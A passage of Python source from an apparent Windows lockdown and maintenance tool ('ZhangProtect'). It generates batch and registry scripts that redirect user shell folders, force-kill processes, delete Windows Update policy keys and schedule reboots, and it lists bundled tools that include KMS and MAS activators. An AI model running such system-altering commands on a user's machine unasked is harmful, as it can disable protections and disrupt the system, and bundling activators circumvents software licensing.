            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Huorong\\Sysdiag\\app /t reg_sz /v DataPath /d %data%:\\StorageRedirect\\HuoRongData /f >nul 2>&1"
            + chr(10)
            + "goto 1"
        )
        RestoreAppdata_reg_text = (
            "Windows Registry Editor Version 5.00"
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders]"
            + chr(10)
            + ""
            + chr(34)
            + "AppData"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,\\"
            + chr(10)
            + "  4c,00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,52,\\"
            + chr(10)
            + "  00,6f,00,61,00,6d,00,69,00,6e,00,67,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "Cache"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,4c,\\"
            + chr(10)
            + "  00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,4c,00,\\"
            + chr(10)
            + "  6f,00,63,00,61,00,6c,00,5c,00,4d,00,69,00,63,00,72,00,6f,00,73,00,6f,00,66,\\"
            + chr(10)
            + "  00,74,00,5c,00,57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,5c,00,49,00,4e,00,\\"
            + chr(10)
            + "  65,00,74,00,43,00,61,00,63,00,68,00,65,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "Cookies"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,\\"
            + chr(10)
            + "  4c,00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,4c,\\"
            + chr(10)
            + "  00,6f,00,63,00,61,00,6c,00,5c,00,4d,00,69,00,63,00,72,00,6f,00,73,00,6f,00,\\"
            + chr(10)
            + "  66,00,74,00,5c,00,57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,5c,00,49,00,4e,\\"
            + chr(10)
            + "  00,65,00,74,00,43,00,6f,00,6f,00,6b,00,69,00,65,00,73,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "Desktop"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,\\"
            + chr(10)
            + "  4c,00,45,00,25,00,5c,00,44,00,65,00,73,00,6b,00,74,00,6f,00,70,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "Favorites"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,\\"
            + chr(10)
            + "  4c,00,45,00,25,00,5c,00,46,00,61,00,76,00,6f,00,72,00,69,00,74,00,65,00,73,\\"
            + chr(10)
            + "  00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "History"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,\\"
            + chr(10)
            + "  4c,00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,4c,\\"
            + chr(10)
            + "  00,6f,00,63,00,61,00,6c,00,5c,00,4d,00,69,00,63,00,72,00,6f,00,73,00,6f,00,\\"
            + chr(10)
            + "  66,00,74,00,5c,00,57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,5c,00,48,00,69,\\"
            + chr(10)
            + "  00,73,00,74,00,6f,00,72,00,79,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "Local AppData"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,\\"
            + chr(10)
            + "  49,00,4c,00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,\\"
            + chr(10)
            + "  00,4c,00,6f,00,63,00,61,00,6c,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "My Music"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,\\"
            + chr(10)
            + "  4c,00,45,00,25,00,5c,00,4d,00,75,00,73,00,69,00,63,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "My Pictures"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,\\"
            + chr(10)
            + "  00,4c,00,45,00,25,00,5c,00,50,00,69,00,63,00,74,00,75,00,72,00,65,00,73,00,\\"
            + chr(10)
            + "  00,00"
            + chr(10)
            + ""
            + chr(34)
            + "My Video"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,\\"
            + chr(10)
            + "  4c,00,45,00,25,00,5c,00,56,00,69,00,64,00,65,00,6f,00,73,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "NetHood"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,\\"
            + chr(10)
            + "  4c,00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,52,\\"
            + chr(10)
            + "  00,6f,00,61,00,6d,00,69,00,6e,00,67,00,5c,00,4d,00,69,00,63,00,72,00,6f,00,\\"
            + chr(10)
            + "  73,00,6f,00,66,00,74,00,5c,00,57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,5c,\\"
            + chr(10)
            + "  00,4e,00,65,00,74,00,77,00,6f,00,72,00,6b,00,20,00,53,00,68,00,6f,00,72,00,\\"
            + chr(10)
            + "  74,00,63,00,75,00,74,00,73,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "Personal"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,\\"
            + chr(10)
            + "  4c,00,45,00,25,00,5c,00,44,00,6f,00,63,00,75,00,6d,00,65,00,6e,00,74,00,73,\\"
            + chr(10)
            + "  00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "PrintHood"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,\\"
            + chr(10)
            + "  4c,00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,52,\\"
            + chr(10)
            + "  00,6f,00,61,00,6d,00,69,00,6e,00,67,00,5c,00,4d,00,69,00,63,00,72,00,6f,00,\\"
            + chr(10)
            + "  73,00,6f,00,66,00,74,00,5c,00,57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,5c,\\"
            + chr(10)
            + "  00,50,00,72,00,69,00,6e,00,74,00,65,00,72,00,20,00,53,00,68,00,6f,00,72,00,\\"
            + chr(10)
            + "  74,00,63,00,75,00,74,00,73,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "Programs"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,\\"
            + chr(10)
            + "  4c,00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,52,\\"
            + chr(10)
            + "  00,6f,00,61,00,6d,00,69,00,6e,00,67,00,5c,00,4d,00,69,00,63,00,72,00,6f,00,\\"
            + chr(10)
            + "  73,00,6f,00,66,00,74,00,5c,00,57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,5c,\\"
            + chr(10)
            + "  00,53,00,74,00,61,00,72,00,74,00,20,00,4d,00,65,00,6e,00,75,00,5c,00,50,00,\\"
            + chr(10)
            + "  72,00,6f,00,67,00,72,00,61,00,6d,00,73,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "Recent"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,4c,\\"
            + chr(10)
            + "  00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,52,00,\\"
            + chr(10)
            + "  6f,00,61,00,6d,00,69,00,6e,00,67,00,5c,00,4d,00,69,00,63,00,72,00,6f,00,73,\\"
            + chr(10)
            + "  00,6f,00,66,00,74,00,5c,00,57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,5c,00,\\"
            + chr(10)
            + "  52,00,65,00,63,00,65,00,6e,00,74,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "SendTo"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,4c,\\"
            + chr(10)
            + "  00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,52,00,\\"
            + chr(10)
            + "  6f,00,61,00,6d,00,69,00,6e,00,67,00,5c,00,4d,00,69,00,63,00,72,00,6f,00,73,\\"
            + chr(10)
            + "  00,6f,00,66,00,74,00,5c,00,57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,5c,00,\\"
            + chr(10)
            + "  53,00,65,00,6e,00,64,00,54,00,6f,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "Start Menu"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,\\"
            + chr(10)
            + "  00,4c,00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,\\"
            + chr(10)
            + "  52,00,6f,00,61,00,6d,00,69,00,6e,00,67,00,5c,00,4d,00,69,00,63,00,72,00,6f,\\"
            + chr(10)
            + "  00,73,00,6f,00,66,00,74,00,5c,00,57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,\\"
            + chr(10)
            + "  5c,00,53,00,74,00,61,00,72,00,74,00,20,00,4d,00,65,00,6e,00,75,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "Startup"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,\\"
            + chr(10)
            + "  4c,00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,52,\\"
            + chr(10)
            + "  00,6f,00,61,00,6d,00,69,00,6e,00,67,00,5c,00,4d,00,69,00,63,00,72,00,6f,00,\\"
            + chr(10)
            + "  73,00,6f,00,66,00,74,00,5c,00,57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,5c,\\"
            + chr(10)
            + "  00,53,00,74,00,61,00,72,00,74,00,20,00,4d,00,65,00,6e,00,75,00,5c,00,50,00,\\"
            + chr(10)
            + "  72,00,6f,00,67,00,72,00,61,00,6d,00,73,00,5c,00,53,00,74,00,61,00,72,00,74,\\"
            + chr(10)
            + "  00,75,00,70,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "Templates"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,\\"
            + chr(10)
            + "  4c,00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,52,\\"
            + chr(10)
            + "  00,6f,00,61,00,6d,00,69,00,6e,00,67,00,5c,00,4d,00,69,00,63,00,72,00,6f,00,\\"
            + chr(10)
            + "  73,00,6f,00,66,00,74,00,5c,00,57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,5c,\\"
            + chr(10)
            + "  00,54,00,65,00,6d,00,70,00,6c,00,61,00,74,00,65,00,73,00,00,00"
            + chr(10)
            + ""
            + chr(34)
            + "{374DE290-123F-4565-9164-39C4925E467B}"
            + chr(34)
            + "=hex(2):25,00,55,00,53,00,45,00,52,00,\\"
            + chr(10)
            + "  50,00,52,00,4f,00,46,00,49,00,4c,00,45,00,25,00,5c,00,44,00,6f,00,77,00,6e,\\"
            + chr(10)
            + "  00,6c,00,6f,00,61,00,64,00,73,00,00,00"
            + chr(10)
            + ""
            + chr(10)
            + "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders]"
            + chr(10)
            + ""
            + chr(34)
            + "!Do not use this registry key"
            + chr(34)
            + "="
            + chr(34)
            + "Use the SHGetFolderPath or SHGetKnownFolderPath function instead"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "AppData"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Roaming"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Local AppData"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Local"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "CD Burning"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Local\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\Burn\\"
            + "\\Burn"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "{1B3EA5DC-B587-4786-B4EF-BD1DC332AEAE}"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Roaming\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\Libraries"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "My Video"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\Videos"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "My Pictures"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\Pictures"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Desktop"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\Desktop"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "History"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Local\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\History"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "NetHood"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Roaming\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\Network Shortcuts"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "{56784854-C6CB-462B-8169-88E350ACB882}"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\Contacts"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "{00BCFC5A-ED94-4E48-96A1-3F6217F21990}"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Local\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\RoamingTiles"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Cookies"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Local\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\INetCookies"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Favorites"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\Favorites"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "SendTo"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Roaming\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\SendTo"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Start Menu"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Roaming\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\Start Menu"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "My Music"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\Music"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Programs"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Roaming\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\Start Menu\\"
            + "\\Programs"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Recent"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Roaming\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\Recent"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "PrintHood"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Roaming\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\Printer Shortcuts"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "{7D1D3A04-DEBB-4115-95CF-2F29DA2920DA}"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\Searches"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "{374DE290-123F-4565-9164-39C4925E467B}"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\Downloads"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "{A520A1A4-1780-4FF6-BD18-167343C5AF16}"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\LocalLow"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Startup"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Roaming\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\Start Menu\\"
            + "\\Programs\\"
            + "\\Startup"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Administrative Tools"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Roaming\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\Start Menu\\"
            + "\\Programs\\"
            + "\\Administrative Tools"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Personal"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\Documents"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "{BFB9D5E0-C6A9-404C-B2B2-AE6DB6AF4968}"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\Links"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Cache"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Local\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\INetCache"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Templates"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\AppData\\"
            + "\\Roaming\\"
            + "\\Microsoft\\"
            + "\\Windows\\"
            + "\\Templates"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "{4C5C32FF-BB9D-43B0-B5B4-2D72E54EAAA4}"
            + chr(34)
            + "="
            + chr(34)
            + "%userprofile%\\"
            + "\\Saved Games"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(34)
            + "Fonts"
            + chr(34)
            + "="
            + chr(34)
            + "C:\\"
            + "\\WINDOWS\\"
            + "\\Fonts"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(10)
            + ""
            + chr(10)
            + ""
            + chr(10)
            + ";中文"
        )
        SysUpdate_mode_bat = (
            "@echo off"
            + chr(10)
            + "cd /d "
            + chr(34)
            + "%~dp0"
            + chr(34)
            + ""
            + chr(10)
            + "color a"
            + chr(10)
            + "title 系统更新"
            + chr(10)
            + "echo 您是否需要更新系统?如果需要请运行此批处理,否则请退出"
            + chr(10)
            + "echo 运行本批处理后,将还原ZhangProtect对Windows更新的更改,AppData的修改,并暂停ZhangProtect,Disable_Safety的工作"
            + chr(10)
            + "echo 执行更新后可以再次运行本批处理来回到ZhangProtect工作模式"
            + chr(10)
            + "echo 为防止误触,需要您确认三次:1..."
            + chr(10)
            + "pause"
            + chr(10)
            + "cls"
            + chr(10)
            + "echo 为防止误触,需要您确认三次:2..."
            + chr(10)
            + "pause"
            + chr(10)
            + "cls"
            + chr(10)
            + "echo 为防止误触,需要您确认三次:3..."
            + chr(10)
            + "pause"
            + chr(10)
            + "cls"
            + chr(10)
            + "echo 开始执行..."
            + chr(10)
            + "if exist "
            + chr(34)
            + "SystemUpdateMode"
            + chr(34)
            + " ("
            + chr(10)
            + "echo 当前ZhangProtect处于:系统更新模式,将恢复ZhangProtect,Disable_Safety的工作"
            + chr(10)
            + "echo 如果恢复失败,请手动重命名 %systemroot%\\Protect\\Protect.exe.bak 去除后缀 .bak"
            + chr(10)
            + "timeout /t 3 /nobreak 2>nul>nul"
            + chr(10)
            + f"{Disable_Safety_exe} restore=1"
            + chr(10)
            + "f"
            + chr(10)
            + "start /min "
            + chr(34)
            + ""
            + chr(34)
            + " cmd /c %systemroot%\\disable_safety.bat"
            + chr(10)
            + "schtasks /Run /I /tn ZhangProtect\\Protect"
            + chr(10)
            + "del /f /q SystemUpdateMode"
            + chr(10)
            + "echo 完成!"
            + chr(10)
            + "timeout /t 3 /nobreak 2>nul>nul"
            + chr(10)
            + "exit"
            + chr(10)
            + ") else ("
            + chr(10)
            + "echo 当前ZhangProtect处于:工作模式,将开始还原对Windows更新的更改,AppData的修改,并暂停ZhangProtect,Disable_Safety的工作"
            + chr(10)
            + "timeout /t 3 /nobreak 2>nul>nul"
            + chr(10)
            + "cls"
            + chr(10)
            + "echo 正在暂停ZhangProtect,Disable_Safety的工作"
            + chr(10)
            + "schtasks /End /tn ZhangProtect\\Protect 2>nul>nul"
            + chr(10)
            + "for /f "
            + chr(34)
            + "tokens=1 delims=,"
            + chr(34)
            + " %%i in ('schtasks /query /fo csv /tn ZhangProtect\\ /NH') do ("
            + chr(10)
            + "schtasks /END /tn %%i 2>nul>nul"
            + chr(10)
            + ")"
            + chr(10)
            + "for /f "
            + chr(34)
            + "delims="
            + chr(34)
            + " %%i in ('dir c:\\windows\\protect\\*.exe /A /B /S') do (title %%i & taskkill /f /im %%~ni.exe 2>nul>nul /t & powershell "
            + chr(34)
            + "Get-Process -Name %%~ni | Stop-Process -Force"
            + chr(34)
            + " 2>nul>nul)"
            + chr(10)
            + "echo 已临时重命名ZhangProtect为 .bak 文件(更新完毕后请手动恢复)"
            + chr(10)
            + "move /Y %systemroot%\\Protect\\Protect.exe %systemroot%\\Protect\\Protect.exe.bak"
            + chr(10)
            + "del /f /q %systemroot%\\disable_safety.bat"
            + chr(10)
            + "del /f /q %systemroot%\\Protect\\AllCommand.bat"
            + chr(10)
            + "del /f /q %systemroot%\\Protect\\BINRD.bat"
            + chr(10)
            + "echo 移除对Windows更新的更改"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX /f"
            + chr(10)
            + "timeout /t 1 /nobreak 2>nul>nul"
            + chr(10)
            + "rem echo 还原Appdata位置(若失败请手动导入 %systemroot%\\Protect\\RestoreAppdataChange.reg)"
            + chr(10)
            + "rem regedit /s %systemroot%\\Protect\\RestoreAppdataChange.reg"
            + chr(10)
            + "timeout /t 1 /nobreak 2>nul>nul"
            + chr(10)
            + "echo 完成!重启系统后您可以进行系统更新"
            + chr(10)
            + "timeout /t 3 /nobreak 2>nul>nul"
            + chr(10)
            + "shutdown -r -t 60 -c "
            + chr(34)
            + "ZhangProtect已进入系统更新模式,一分钟后重启"
            + chr(34)
            + ""
            + chr(10)
            + "echo > SystemUpdateMode"
            + chr(10)
            + "exit"
            + chr(10)
            + ")"
            + chr(10)
            + "rem 中文"
        )
        clear_icon_cache_text = (
            "taskkill /f /im explorer.exe"
            + chr(10)
            + "attrib -h -s -r "
            + chr(34)
            + "%userprofile%\\AppData\\Local\\IconCache.db"
            + chr(34)
            + ""
            + chr(10)
            + "del /f "
            + chr(34)
            + "%userprofile%\\AppData\\Local\\IconCache.db"
            + chr(34)
            + ""
            + chr(10)
            + "attrib /s /d -h -s -r "
            + chr(34)
            + "%userprofile%\\AppData\\Local\\Microsoft\\Windows\\Explorer\\*"
            + chr(34)
            + ""
            + chr(10)
            + "del /f "
            + chr(34)
            + "%userprofile%\\AppData\\Local\\Microsoft\\Windows\\Explorer\\thumbcache_*.db"
            + chr(34)
            + ""
            + chr(10)
            + "reg delete "
            + chr(34)
            + "HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\TrayNotify"
            + chr(34)
            + " /v IconStreams /f"
            + chr(10)
            + "reg delete "
            + chr(34)
            + "HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\TrayNotify"
            + chr(34)
            + " /v PastIconsStream /f"
            + chr(10)
            + "start explorer"
        )
        # 在每个文件中加入中文,文本不包含中文时,编码无法使用GBK格式,会被保存为utf-8
        create_script(RestoreAppdata_reg, RestoreAppdata_reg_text)
        create_script(SysUpdate_mode, SysUpdate_mode_bat)
        AllCommands += chr(10) + "rem 中文"  # 批处理注释使用rem
        create_script(AllRunCommand, AllCommands)
        clear_icon_cache_text += chr(10) + "rem 中文"
        create_script(clear_icon_cache_bat, clear_icon_cache_text)
        AllSchrun += chr(10) + "rem 中文"
        create_script(AllSchrunBA, AllSchrun)
        BatComA += chr(10) + "rem 中文"
        create_script(ProtectBAT, BatComA)
        HuoRongDataRedirect_com += chr(10) + "rem 中文"
        create_script(HuoRongDataRedirect_bat, HuoRongDataRedirect_com)
        WifiShareStart += chr(10) + "#中文"  # powershell注释使用#
        create_script(ProtectWifi, WifiShareStart)
        BATRUNVBS += chr(10) + "'中文"
        create_script(BATKEEPER, BATRUNVBS)
        Uninstaller += chr(10) + "rem 中文"
        create_script(UNINST, Uninstaller)
        if os.path.isfile(use_USB_protect) and not os.path.isfile(disable_Winmgmt):
            USBWrite += chr(10) + "rem 中文"
            create_script(UsbChanger, USBWrite)
        else:
            create_script(UsbChanger, "exit")
        VBAllRun += chr(10) + "'中文"
        create_script(VBAllRunF, VBAllRun)
        regfix += chr(10) + ";中文"  # reg包括regini注释使用;
        create_script(regfixfile, regfix)
        create_script(ncsi, "Microsoft NCSI联网测试")
        regini += chr(10) + ";中文"
        create_script(reginifile, regini)
        systemappfixpow += chr(10) + "#中文"
        create_script(systemappfix, systemappfixpow)
        MainTainCleanBat += chr(10) + "rem 中文"
        create_script(MainTainClean, MainTainCleanBat)
        ErrorAutoFixBat_text += chr(10) + "rem 中文"
        create_script(ErrorAutoFix, ErrorAutoFixBat_text)
        create_script(Maintain_mode, Maintain_mode_bat)
        create_script(ErrorAutoFixXml, ErrorAutoFixXml_text)
        create_script(volume_set_vbs, volumeset_vbs_text)
        create_script(set_admin_attrib, set_admin_attrib_bat)
        # ---把批处理的注册表修改同步一遍---
        logger.log("[批处理-->注册表同步]开始同步")
        bat_to_reg_reader(AllCommands)
        bat_to_reg_reader(BatComA)
        logger.log("[批处理-->注册表同步]同步完成")
        # ---把批处理的注册表修改同步一遍---
        with smart_open.smart_opens(
            StopWifiShare,
            "w",
        ) as f:
            f.write(StopWifiShareps)
        try:
            if os.path.isdir(CCleanerLOG):
                shutil.rmtree(CCleanerLOG)
        except:
            pass
        try:
            if os.path.isdir(FreeFileSync_LOG):
                shutil.rmtree(FreeFileSync_LOG)
        except:
            pass
        try:
            if os.path.isdir(RegistryFinder_UndoHistory):
                shutil.rmtree(RegistryFinder_UndoHistory)
            if os.path.isdir(RegistryFinder_VisitationHistory):
                shutil.rmtree(RegistryFinder_VisitationHistory)
        except:
            pass
        try:
            create_nomedia_files()
        except:
            pass
        if os.path.isfile(force_out_files):
            Maintain_protects_list = [Disable_Safety_exe, Zhang_PE_ToolEXE, README]
            Maintain_tools_folder_list = [
                KMSActivatorExe,
                WifiMobileToolExe,
                ZhangGameRedDot_exe,
                WindowDebugTool_E,
                ZhangKeyLauncher_exe,
                NSudo,
                ProcessMonitor_exe,
                procexp64_exe,
                Autoruns64_exe,
                WizTree_exe,
                ContextMenuManager_exe,
                fastcopy_exe,
                zip7installer_exe,
                WinRARinstaller_exe,
                DGuardInstallexe,
                BlueScreenView_exe,
                UltraISO_exe,
                rufus_exe,
                diskgenius_exe,
                WinDbg_dir,
                CCleanerDir,
                WinSCP_dir,
                RDPWrapDir,
                LockHunter_dir,
                FreeFileSync_dir,
                ffmpeg_helper,
                Everything_Dir,
                SystemInfoChanger_exe,
                Speccy_dir,
                RegistryFinder_dir,
                notepad_plus_installer,
                SetProToPcore_exe,
                AutoRemove_DRIVE_REMOVABLE_exe,
                WinHex_exe,
                h2testw_exe,
                MAS_dir,
                aria2_dir,
                shexview_exe,
                shexview_lng_ini,
                set_admin_attrib,
                PingFangTTF_dir,
                FontTools_dir,
                NetTime_exe,
                ProcessLasso_dir,
                taskbar_hider_exe,
                AutoPowerOptionsOK_exe,
                DontSleep_exe,
                runas_user_exe,
                XYplorer_dir,
                PsTools_dir,
                WeiWeiFont_exe,
                PrivaZer_Dir,
                simplewall_exe,
                simplewall_lng,
                AutoScreenshot_dir,
                DataLgloo_Installer,
                keyboard_filter_exe,
                HuorongData_dat,
                TurboSwitch_exe,
